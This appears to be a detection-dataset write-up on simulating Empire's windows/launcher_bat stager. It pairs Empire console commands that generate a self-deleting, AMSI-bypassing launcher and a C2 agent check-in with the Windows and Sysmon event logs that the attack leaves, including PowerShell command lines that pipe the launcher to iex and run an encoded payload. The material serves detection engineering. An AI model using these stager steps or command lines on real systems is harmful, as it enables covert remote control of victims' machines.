# Empire-Windows-Launcher-Bat

## DataSet Description 
The adversary  might used empire' launcher_bat stager to execute code in the environment. This attack example can be leveraged by attackers in a physical way, such as rubber ducky.

## Simulation Plan
| Environment | Tool Type | Module                      |
| ----------- | --------- | --------------------------- |
| WIN10       | C2        | empire:windows/launcher_bat |

```bash
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > info
Name: BAT Launcher
Description:
  Generates a self-deleting .bat launcher for Empire.
Options:
  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        powershell        Language of the stager to generate.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.
  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
                                                 otherwise displayed on the screen.
  Delete           False       True              Switch. Delete .bat after running.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation types.
                                                 For powershell only. 
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                 Only used if Obfuscate switch is True.
                                                 For powershell only. 
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
                                                 the stager code.
  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
                                                 the stager code.


(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute
[*] Stager output written out to: /tmp/launcher.bat

(Empire: stager/windows/launcher_bat) > 
[*] Sending POWERSHELL stager (stage 1) to 192.168.254.56
[*] New agent R1SHUP8X checked in
[+] Initial agent R1SHUP8X from 192.168.254.56 now active (Slack)
[*] Sending agent (stage 2) to R1SHUP8X at 192.168.254.56

```
# Explore Dataset
## Adversary Behavior I

| Field                | Value                                                                     |
| -------------------- | ------------------------------------------------------------------------- |
| LogName              | Security                                                                  |
| EventCode            | 4688                                                                      |
| New_Process_ID       | 0x1374                                                                    |
| New_Process_name     | C:\Windows\system32\cmd.exe                                               |
| Process_Command_Line | C:\Windows\system32\cmd.exe /c ""C:\Users\vagrant\Downloads\launcher.bat" |
| TaskCatergory        | Process Creation                                                          |

## Adversary Behavior II
| Field                | Value                                                                                                                                                     |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| LogName              | Security                                                                                                                                                  |
| EventCode            | 4688                                                                                                                                                      |
| Creator_Process_ID   | 0x1374                                                                                                                                                    |
| New_Process_ID       | 0x25f4                                                                                                                                                    |
| New_Process_name     | Creator_Process_ID                                                                                                                                        |
| Process_Command_Line | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText('C:\Users\vagrant\Downloads\launcher.bat')\|iex" |
|                      |
| TaskCatergory        | Process Creation                                                                                                                                          |

## Adversary Behavior III

| Field        | Value                                                                                                                   |
| ------------ | ----------------------------------------------------------------------------------------------------------------------- |
| LogName      | Windows PowerShell                                                                                                      |
| EventCode    | 400                                                                                                                     |
| Message      | *HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc //5112 bytes payload// * |
| TaskCategory | Engine Lifecycle                                                                                                        |

## Adversary Behavior IV

| Field             | Value                                                                                                                                                      |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| LogName           | Microsoft-Windows-Sysmon/Operational                                                                                                                       |
| EventCode         | 1                                                                                                                                                          |
| TaskCategory      | Process Create                                                                                                                                             |
| RuleName          | technique_id=T1059.001,technique_name=PowerShell                                                                                                           |
| ProcessId         | 3988                                                                                                                                                       |
| CommandLine       | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc //5112 byte payload//                                                      |
| ParentProcessId   | 9716                                                                                                                                                       |
| ParentImage       | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                                                                                  |
| ParentCommandLine | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -nol -nop -ep bypass "[IO.File]::ReadAllText('C:\Users\vagrant\Downloads\launcher.bat')\|iex" |
| ProcessGuid       | {bac4bdbc-36f2-5fd8-570d-000000000700}                                                                                                                     |


## Adversary Behavior V
| Field        | Value                                                     |
| ------------ | --------------------------------------------------------- |
| LogName      | Microsoft-Windows-Sysmon/Operational                      |
| EventCode    | 7                                                         |
| ProcessId    | 3988                                                      |
| Image        | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe |
| ImageLoaded  | C:\Windows\System32\wbem\wmiutils.dll                     |
| TaskCategory | Image loaded (rule: ImageLoad)                            |


## Adversary Behavior VI
You can look for Powershell connected to C2
| Field           | Value                                                     |
| --------------- | --------------------------------------------------------- |
| LogName         | Microsoft-Windows-Sysmon/Operational                      |
| EventCode       | 3                                                         |
| ProcessId       | 3988                                                      |
| Image           | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe |
| DestinationIp   | <C2 IP>                                                   |
| DestinationPort | 80                                                        |
| TaskCategory    | Network connection detected (rule: NetworkConnect)        |


## Adversary Behavior VII
Since the C2 connection has established, You can look for Powershell Pipeline Execution Details which invoked "Get-Random" with a few of URL request to pretend normal web traffic
| Field                        | Value                                          |
| ---------------------------- | ---------------------------------------------- |
| LogName                      | Windows PowerShell                             |
| EventCode                    | 800                                            |
| ParameterBinding_Get_Random_ | name="InputObject"; value="/admin/get.php"     |
|                              | name="InputObject"; value="/news.php"          |
|                              | name="InputObject"; value="/login/process.php" |
| TaskCategory                 | Pipeline Execution Details                     |


## Known Bypasses
None

## False Positives
None